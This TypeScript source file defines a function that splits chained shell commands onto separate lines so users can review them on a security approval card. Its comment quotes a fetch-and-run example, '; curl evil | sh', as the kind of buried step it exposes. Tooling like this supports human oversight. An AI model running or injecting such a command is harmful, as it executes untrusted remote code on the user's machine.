// splitBashChains inserts a newline after each top-level `;`, `&&` and `||` so a
// chained one-liner reads as separate steps. It is deliberately optimistic: it
// only tracks quotes and backslash escapes, not the full shell grammar, and a
// command that already contains newlines is left exactly as written.
//
// It is DISPLAY-ONLY and insert-only: it never removes, reorders, or rewrites a
// character, so every byte of the original command is still shown in the same
// order (just with extra line breaks). That property is what makes it safe to use
// on the security approval card - the text a user approves is byte-for-byte the
// command that runs; splitting merely makes a buried `; curl evil | sh` easier to
// spot, never harder.
export function splitBashChains(cmd: string): string {
  if (cmd.includes('\n')) return cmd
  let out = ''
  let inSingle = false
  let inDouble = false
  let escaped = false
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]
    out += ch
    if (escaped) {
      escaped = false
      continue
    }
    if (ch === '\\') {
      escaped = true
      continue
    }
    if (ch === "'" && !inDouble) {
      inSingle = !inSingle
      continue
    }
    if (ch === '"' && !inSingle) {
      inDouble = !inDouble
      continue
    }
    if (inSingle || inDouble) continue
    // `;` splits (but not `;;`, a case terminator); `&&`/`||` split after the
    // second character. A single `|` (pipe) or `&` (background/redirect) does
    // not.
    const isChain = (ch === ';' && cmd[i + 1] !== ';') || ((ch === '&' || ch === '|') && cmd[i + 1] === ch)
    if (!isChain) continue
    if (ch !== ';') out += cmd[++i]
    while (cmd[i + 1] === ' ') i++
    if (i + 1 < cmd.length) out += '\n'
  }
  return out
}
